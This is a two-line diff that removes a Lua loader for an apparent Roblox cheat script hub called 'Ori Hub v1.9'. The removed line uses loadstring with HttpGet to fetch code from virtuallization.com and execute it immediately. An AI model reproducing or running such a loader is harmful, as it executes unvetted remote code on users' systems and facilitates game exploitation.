@@ -1,2 +1,0 @@
---Ori Hub v1.9
-loadstring(game:HttpGet('https://virtuallization.com/OriHubMain.txt'))()
